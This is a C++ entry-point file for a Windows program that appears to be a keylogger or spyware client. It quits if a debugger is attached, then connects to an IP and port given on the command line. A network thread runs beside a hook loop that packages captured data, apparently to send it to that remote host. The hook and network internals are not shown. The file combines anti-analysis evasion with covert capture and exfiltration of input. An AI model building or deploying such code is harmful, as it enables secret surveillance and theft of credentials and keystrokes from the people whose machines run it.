#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <boost/thread.hpp>
#include "Hooker.hh"
#include "reseau/Network.hh"

int main(int ac, char **av)
{
	if (IsDebuggerPresent()) {
		return (-1);
	}
  	if (ac >= 3)
	{
		try {
			Packager* packager = new Packager();
			Network* network = new Network(av[2], av[1], packager);
			Hooker& hooker = Hooker::getInstance();
			hooker.setPackager(packager);
			boost::thread networkThread(&Network::initNetwork, network);
			hooker.runHookLoop();
			networkThread.join();
		}
		catch (std::exception& e) {
			std::cerr << "An error occured:" << std::endl;
			std::cerr << e.what() << std::endl;
			return EXIT_FAILURE;
		}
		return EXIT_SUCCESS;
	}
	std::cerr << "Usage: " << av[0] << " [ip]" << " [port]" << std::endl;
	return EXIT_FAILURE;
}
